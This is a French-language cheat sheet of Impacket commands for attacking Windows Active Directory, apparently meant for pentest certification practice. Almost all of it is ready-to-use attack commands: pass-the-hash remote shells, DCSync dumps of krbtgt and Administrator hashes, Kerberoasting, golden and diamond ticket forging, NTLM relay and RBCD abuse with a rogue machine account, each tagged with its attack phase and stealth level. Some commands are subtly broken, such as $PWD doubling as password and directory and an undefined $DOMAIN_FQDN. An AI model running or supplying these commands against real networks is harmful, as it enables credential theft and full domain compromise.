# Impacket — Référence complète

> Suite d'outils Python pour l'exploitation des protocoles réseau Windows. La boîte à outils indispensable du pentesteur AD.

---

## Variables de référence

```bash
DOMAIN='entreprise.local'
DC='dc01.entreprise.local'
DC_IP='192.168.X.10'
USER='alice'
PWD='Password123!'
HASH='aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF001122'  # LM:NT
NT_HASH="${HASH##*:}"
```

---

## Authentification — Exécution à distance

### psexec.py — Shell SYSTEM via SMB

```bash
# Avec mot de passe
psexec.py $DOMAIN/$USER:'$PWD'@$DC_IP

# Pass-the-Hash
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP

# Pass-the-Ticket
psexec.py -k -no-pass $DOMAIN/$USER@$DC

# Commande unique (sans shell interactif)
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP cmd.exe /c "whoami /all"
```

**Caractéristiques :** Crée un service temporaire. Shell SYSTEM. Bruyant (logs Event 7045).

### wmiexec.py — Shell via WMI (plus discret)

```bash
# Avec mot de passe
wmiexec.py $DOMAIN/$USER:'$PWD'@$DC_IP

# Pass-the-Hash
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP

# Pass-the-Ticket
wmiexec.py -k -no-pass $DOMAIN/$USER@$DC

# Commande unique
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP "whoami"
```

**Caractéristiques :** Utilise WMI (port 135+RPC). Contexte de l'utilisateur (pas SYSTEM). Plus discret que psexec.

### smbexec.py — Shell via SMB (sans upload de fichier)

```bash
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP
smbexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP
smbexec.py $DOMAIN/$USER:'$PWD'@$DC_IP
```

---

## Dump de credentials

### secretsdump.py — Le plus important

```bash
# DCSync complet (nécessite droits DA ou DCSync)
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP -just-dc-ntlm

# DCSync avec hash (PtH)
secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP -just-dc-ntlm

# DCSync via ticket Kerberos
secretsdump.py -k -no-pass $DOMAIN/$USER@$DC -just-dc

# Dump SAM + LSA d'une machine
secretsdump.py $DOMAIN/$USER:'$PWD'@$TARGET_IP

# Dump uniquement un compte
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP -just-dc-user krbtgt
secretsdump.py $DOMAIN/$USER:'$PWD'@$DC_IP -just-dc-user Administrator

# Dump depuis fichiers locaux (NTDS.dit + SYSTEM récupérés)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Kerberos

### getTGT.py — Obtenir un TGT

```bash
getTGT.py $DOMAIN_FQDN/$USER:$PWD
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

### GetUserSPNs.py — Kerberoasting

```bash
# Lister les SPNs
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP

# Récupérer les hashes TGS
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP \
    -request -outputfile ~/certif/hashes/kerberoast.hash

# Cibler un compte spécifique
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -request-user svc_sql -dc-ip $DC_IP

# Avec hash
GetUserSPNs.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER -dc-ip $DC_IP -request
```

### GetNPUsers.py — AS-REP Roasting

```bash
# Sans auth (avec liste d'users)
GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
    -usersfile ~/certif/users.txt \
    -dc-ip $DC_IP \
    -outputfile ~/certif/hashes/asrep.hash

# Avec auth
GetNPUsers.py $DOMAIN_FQDN/$USER:$PWD \
    -request -format hashcat \
    -outputfile ~/certif/hashes/asrep.hash
```

### getST.py — S4U (Délégation contrainte / RBCD)

```bash
# S4U2self + S4U2proxy
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/svc_delegate:$SVC_PWD

# Avec compte machine (RBCD)
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/EVIL\$:'EvilPass123!'

export KRB5CCNAME=$PWD/Administrator.ccache
```

### ticketer.py — Forger des tickets

```bash
# Golden Ticket
ticketer.py -nthash $KRBTGT_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            Administrator

# Silver Ticket
ticketer.py -nthash $SVC_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            -spn MSSQLSvc/sql01.entreprise.local:1433 \
            Administrator

# Diamond Ticket (plus furtif)
ticketer.py -nthash $KRBTGT_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            -request -user $USER -password $PWD \
            -dc-ip $DC_IP \
            Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
```

### ticketConverter.py — Conversion ccache ↔ kirbi

```bash
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## Énumération

### ldapdomaindump

```bash
# Dump LDAP complet
ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP -o ~/certif/loot/ldap/

# Avec hash
ldapdomaindump -u "$DOMAIN\\$USER" --no-json --no-grep \
    -hashes :$NT_HASH $DC_IP -o ~/certif/loot/ldap/

# Ouvrir les résultats
firefox ~/certif/loot/ldap/domain_users.html
```

### lookupsid.py — Récupérer le SID

```bash
lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0 | head
lookupsid.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP 0 | head
```

### findDelegation.py — Trouver les délégations

```bash
findDelegation.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP
```

---

## Relay et attaques réseau

### ntlmrelayx.py

```bash
# Relay SMB basique
ntlmrelayx.py -tf targets.txt -smb2support

# Relay avec mode SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Relay vers LDAP
ntlmrelayx.py -t ldap://$DC_IP --no-da --no-acl

# Relay vers LDAPS avec RBCD
ntlmrelayx.py -t ldaps://$DC_IP --delegate-access --add-computer

# Relay IPv6 + SOCKS
ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support -tf targets.txt
```

### addcomputer.py — Créer un compte machine (pour RBCD)

```bash
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
               -dc-host $DC -dc-ip $DC_IP \
               $DOMAIN_FQDN/$USER:$PWD
```

### rbcd.py — Configurer la délégation RBCD

```bash
rbcd.py -delegate-from 'EVIL$' \
        -delegate-to 'TARGET$' \
        -dc-ip $DC_IP \
        -action write \
        $DOMAIN_FQDN/$USER:$PWD
```

---

## Accès aux partages

### smbclient.py

```bash
smbclient.py $DOMAIN/$USER:'$PWD'@$DC_IP
smbclient.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP
smbclient.py -k $DOMAIN/$USER@$DC  # Kerberos
```

---

## Gestion du temps (si "Clock skew too great")

```bash
sudo ntpdate $DC_IP
sudo rdate -n $DC_IP
sudo systemctl stop systemd-timesyncd
sudo timedatectl set-ntp false
```

---

## Tableau de référence rapide

| Outil | Usage | Phase |
|-------|-------|-------|
| `psexec.py` | Shell SYSTEM via SMB | Mouvement latéral |
| `wmiexec.py` | Shell via WMI (discret) | Mouvement latéral |
| `smbexec.py` | Shell via SMB | Mouvement latéral |
| `secretsdump.py` | DCSync, dump SAM/LSA | Compromission |
| `getTGT.py` | Obtenir un TGT | Kerberos |
| `GetUserSPNs.py` | Kerberoasting | Escalade |
| `GetNPUsers.py` | AS-REP Roasting | Escalade / initial |
| `getST.py` | S4U pour délégation | Escalade |
| `ticketer.py` | Golden/Silver/Diamond Ticket | Persistance |
| `ntlmrelayx.py` | Relay NTLM | Accès initial |
| `addcomputer.py` | Créer compte machine | RBCD |
| `rbcd.py` | Configurer RBCD | Escalade |
| `lookupsid.py` | Récupérer SID domaine | Pré-Golden Ticket |
| `findDelegation.py` | Trouver délégations | Énumération |
| `ldapdomaindump` | Dump LDAP | Énumération |
